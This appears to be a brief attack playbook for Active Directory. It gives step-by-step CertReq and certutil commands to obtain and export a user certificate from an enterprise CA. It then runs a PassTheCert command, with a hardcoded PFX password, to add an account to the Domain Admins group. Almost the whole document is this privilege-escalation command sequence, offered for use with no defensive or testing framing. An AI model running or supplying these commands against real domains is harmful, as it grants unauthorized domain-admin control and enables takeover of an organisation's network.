### Request Certificate and Add User to Domain Admins Group

**Objective:** Request a certificate using CertReq and use it to add a user to the Domain Admins group.

#### 1. Request a Certificate

1. **Create a Certificate Request:**
    ```plaintext
    CertReq.exe -new <path>\msblah.inf <path>\msblah.req
    ```

2. **Submit the Certificate Request:**
    ```plaintext
    CertReq.exe -Submit -config X10.test-globalx.com\OrgIssuing-3A <path>\msblah.req <path>\msblah.cer
    ```

3. **Accept the Certificate:**
    ```plaintext
    CertReq.exe -accept <path>\msblah.cer -user
    ```

4. **Export the Certificate to PFX:**
    ```powershell
    $Thumbprint = Get-ChildItem Cert:\CurrentUser\My | Select-Object -Property Thumbprint -Last 1
    certutil -user -exportpfx My $Thumbprint.Thumbprint <path>\msblah.pfx "nochain"
    ```

**Note:**
- Replace `<path>` with the appropriate directory path where you want to save the files.
- Adjust `XN-10.test-globalx.com\OrgIssuing-3A` with the correct configuration for your environment.

#### 2. Use Certificate to Add User to Domain Admins Group

1. **Add User to Domain Admins Group:**
    ```plaintext
    .\PassTheCert.exe --server <DC_FQDN> --cert-path <path>\msblah.pfx --cert-password sinllaves --add-account-to-group --target "CN=Domain Admins,CN=Users,DC=ABCDglb,DC=com" --account "CN=a1,OU=Users,OU=Tier 2,OU=FI,OU=Territories,DC=test-globalx,DC=com"
    ```

**Steps:**

1. **Prepare the Certificate Request:**
   - Create the request using `CertReq.exe -new`.
   - Submit the request using `CertReq.exe -Submit`.
   - Accept the certificate using `CertReq.exe -accept`.
   - Export the certificate to PFX format using `certutil`.

2. **Add User to Domain Admins:**
   - Use `PassTheCert` to add the specified account to the Domain Admins group.

